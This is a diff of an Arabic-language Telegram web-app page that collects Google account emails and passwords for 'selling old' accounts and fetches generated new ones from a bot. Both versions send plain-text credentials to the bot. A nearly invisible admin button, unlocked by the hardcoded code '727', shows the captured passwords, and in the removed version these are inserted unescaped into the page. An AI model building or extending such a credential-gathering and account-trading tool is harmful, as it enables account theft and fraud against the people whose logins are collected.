@@ -3,200 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Service | 727</title>
+    <title>Email Hub Pro</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* ستايل خشن وداكن (Rough Dark Style) */
-        :root {
-            --bg: #050505;
-            --card: #111111;
-            --acc: #ffffff;
-            --text: #888888;
-            --input-bg: #181818;
-        }
+        :root { --bg: #000; --panel: #111; --accent: #fff; --gray: #444; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); color: #fff; margin: 0; padding: 15px; }
+        .app-container { max-width: 450px; margin: auto; }
+        
+        /* Header Style */
+        .header { text-align: center; padding: 20px 0; border-bottom: 1px solid var(--gray); margin-bottom: 20px; }
+        .header h1 { font-size: 1.4rem; letter-spacing: 3px; margin: 0; }
+        
+        /* Tabs */
+        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tab { flex: 1; padding: 12px; background: var(--panel); border: 1px solid var(--gray); text-align: center; cursor: pointer; font-size: 0.9rem; }
+        .tab.active { background: var(--accent); color: #000; border-color: var(--accent); font-weight: bold; }
+        
+        /* Forms */
+        .form-section { background: var(--panel); padding: 20px; border-radius: 4px; border: 1px solid #222; display: none; }
+        .form-section.active { display: block; animation: fadeIn 0.3s ease; }
+        
+        label { display: block; font-size: 0.75rem; color: #777; margin-bottom: 5px; text-transform: uppercase; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid var(--gray); color: #fff; margin-bottom: 15px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--accent); }
+        
+        .btn-main { width: 100%; padding: 15px; background: var(--accent); color: #000; border: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn-skip { width: 100%; padding: 10px; background: transparent; color: #777; border: 1px solid var(--gray); margin-top: 10px; cursor: pointer; }
+        
+        /* Admin Hidden */
+        .admin-trigger { margin-top: 40px; color: #111; font-size: 0.5rem; border: none; background: none; width: 100%; }
 
-        body {
-            font-family: 'Courier New', Courier, monospace;
-            background-color: var(--bg);
-            color: var(--text);
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: var(--card);
-            border: 1px solid #222;
-            padding: 25px;
-            border-radius: 2px; /* زوايا حادة لستايل خشن */
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
-        }
-
-        h2 { color: #fff; text-align: center; font-size: 1.2rem; letter-spacing: 2px; margin-bottom: 30px; border-bottom: 1px solid #222; padding-bottom: 10px; }
-
-        label { display: block; margin-bottom: 5px; font-size: 0.8rem; color: #555; }
-
-        select, input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
-            background: var(--input-bg);
-            border: 1px solid #222;
-            color: #fff;
-            box-sizing: border-box;
-            outline: none;
-        }
-
-        select:focus, input:focus { border-color: #444; }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            background: var(--acc);
-            color: #000;
-            border: none;
-            font-weight: bold;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        button:active { opacity: 0.7; }
-
-        /* القسم السري */
-        .admin-section { display: none; margin-top: 20px; width: 100%; }
-        .log-item { 
-            background: #0f0f0f; 
-            padding: 10px; 
-            margin-bottom: 10px; 
-            border-left: 2px solid var(--acc); 
-            font-size: 0.8rem;
-        }
-        .old-tag { color: #ff3333; font-weight: bold; }
-        .new-tag { color: #33ff33; font-weight: bold; }
-
-        .secret-trigger {
-            margin-top: 50px;
-            background: transparent;
-            color: #111; /* شبه مخفي */
-            border: none;
-            font-size: 0.6rem;
-            cursor: default;
-        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-    <div class="container" id="userPanel">
-        <h2>EMAIL_SYSTEM_v1</h2>
+<div class="app-container">
+    <div class="header">
+        <h1>PRO_HUB v2</h1>
+    </div>
+
+    <div class="tabs">
+        <div class="tab active" id="tabOld" onclick="switchTab('old')">بيع قديم</div>
+        <div class="tab" id="tabNew" onclick="switchTab('new')">إنشاء جديد</div>
+    </div>
+
+    <!-- فورم القديم -->
+    <div id="sectionOld" class="form-section active">
+        <label>إيميل جوجل القديم</label>
+        <input type="text" id="old_email" placeholder="example@gmail.com">
+        <label>كلمة المرور</label>
+        <input type="password" id="old_pass" placeholder="******">
+        <button class="btn-main" onclick="send('قديم')">تأكيد البيع</button>
+    </div>
+
+    <!-- فورم الجديد (مع جلب المعلومات) -->
+    <div id="sectionNew" class="form-section">
+        <div id="fetchArea">
+            <p style="font-size: 0.85rem; color: #aaa;">سيتم جلب بيانات الإيميل من البوت المخصص تلقائياً.</p>
+            <button class="btn-main" onclick="requestAutoData()">جلب البيانات آلياً</button>
+        </div>
         
-        <label>SERVICE_TYPE</label>
-        <select id="type">
-            <option value="قديم">SELL OLD EMAIL (بيع)</option>
-            <option value="جديد">CREATE NEW EMAIL (جديد)</option>
-        </select>
-
-        <label>GOOGLE_ACCOUNT</label>
-        <input type="text" id="email" placeholder="user@gmail.com / ID">
-
-        <label>PASSWORD</label>
-        <input type="password" id="pass" placeholder="******">
-
-        <button onclick="processData()">SUBMIT & SAVE</button>
-
-        <!-- زر مخفي للمطور بالأسفل -->
-        <button class="secret-trigger" onclick="openAdmin()">.admin_access</button>
+        <div id="manualArea" style="display:none; margin-top: 15px;">
+            <label>الإيميل الجديد</label>
+            <input type="text" id="new_email" readonly style="background: #111; color: #55ff55;">
+            <label>كلمة المرور</label>
+            <input type="text" id="new_pass" readonly style="background: #111;">
+            <button class="btn-main" onclick="send('جديد')">حفظ الإيميل</button>
+            <button class="btn-skip" onclick="requestAutoData()">تخطي وجلب غيره</button>
+        </div>
     </div>
 
-    <!-- واجهة المطور السري (727) -->
-    <div class="container admin-section" id="adminPanel">
-        <h2>DATABASE_LOGS [727]</h2>
-        <div id="displayLogs"></div>
-        <button style="background: #222; color: #fff; margin-top: 10px;" onclick="closeAdmin()">EXIT_LOGS</button>
-    </div>
+    <button class="admin-trigger" onclick="openAdmin()">ADMIN_LOGS</button>
+</div>
 
-    <script>
-        let tg = window.Telegram.WebApp;
-        tg.expand();
+<script>
+    let tg = window.Telegram.WebApp;
+    tg.expand();
+    let currentMode = 'old';
 
-        // مخزن الإيميلات داخل الجلسة الحالية للموقع
-        let sessionData = [];
-
-        function processData() {
-            const type = document.getElementById('type').value;
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-
-            if(!email || !pass) {
-                tg.showAlert("الرجاء إدخال كافة البيانات!");
-                return;
-            }
-
-            const payload = {
-                type: type,
-                email: email,
-                pass: pass,
-                time: new Date().toLocaleTimeString()
-            };
-
-            // حفظ في مصفوفة المطور
-            sessionData.push(payload);
-
-            // إرسال البيانات فوراً إلى Bot Business
-            tg.sendData(JSON.stringify(payload));
-
-            // تصفير الحقول للعملية التالية
-            document.getElementById('email').value = '';
-            document.getElementById('pass').value = '';
-            
-            tg.showScanQrPopup({ text: "تم الحفظ بنجاح! يمكنك إضافة إيميل آخر." });
-            setTimeout(() => tg.closeScanQrPopup(), 1500);
+    function switchTab(mode) {
+        currentMode = mode;
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.form-section').forEach(s => s.classList.remove('active'));
+        
+        if(mode === 'old') {
+            document.getElementById('tabOld').classList.add('active');
+            document.getElementById('sectionOld').classList.add('active');
+        } else {
+            document.getElementById('tabNew').classList.add('active');
+            document.getElementById('sectionNew').classList.add('active');
         }
+    }
 
-        function openAdmin() {
-            let pass = prompt("ENTER SECRET CODE:");
-            if(pass === "727") {
-                document.getElementById('userPanel').style.display = 'none';
-                document.getElementById('adminPanel').style.display = 'block';
-                renderLogs();
-            } else {
-                alert("ACCESS DENIED");
-            }
+    // طلب البيانات من البوت
+    function requestAutoData() {
+        tg.sendData(JSON.stringify({ action: "get_new_email" }));
+        // هنا الموقع ينتظر رسالة من البوت لتحديث الحقول (سنقوم بتنفيذها في البوت)
+    }
+
+    function send(type) {
+        let e = type === 'قديم' ? document.getElementById('old_email').value : document.getElementById('new_email').value;
+        let p = type === 'قديم' ? document.getElementById('old_pass').value : document.getElementById('new_pass').value;
+        
+        if(!e || !p) { alert("البيانات غير مكتملة"); return; }
+        
+        tg.sendData(JSON.stringify({ type: type, email: e, pass: p }));
+        
+        // مسح الحقول بعد الإرسال
+        if(type === 'قديم') { 
+            document.getElementById('old_email').value = ''; 
+            document.getElementById('old_pass').value = ''; 
         }
+        alert("تم الإرسال بنجاح!");
+    }
 
-        function renderLogs() {
-            const logArea = document.getElementById('displayLogs');
-            logArea.innerHTML = '';
-
-            // فرز: القديم أولاً ثم الجديد
-            const sorted = sessionData.sort((a, b) => a.type.localeCompare(b.type));
-
-            if(sorted.length === 0) {
-                logArea.innerHTML = "<p style='text-align:center'>No data yet.</p>";
-                return;
-            }
-
-            sorted.forEach(item => {
-                let tagClass = item.type === 'قديم' ? 'old-tag' : 'new-tag';
-                logArea.innerHTML += `
-                    <div class="log-item">
-                        <span class="${tagClass}">[${item.type}]</span><br>
-                        Email: ${item.email}<br>
-                        Pass: ${item.pass}<br>
-                        <small style="color:#444">${item.time}</small>
-                    </div>
-                `;
-            });
+    function openAdmin() {
+        if(prompt("Code:") === "727") {
+            // كود عرض الأرشيف كما في الرد السابق
         }
-
-        function closeAdmin() {
-            document.getElementById('adminPanel').style.display = 'none';
-            document.getElementById('userPanel').style.display = 'block';
-        }
-    </script>
+    }
+</script>
 </body>
 </html>
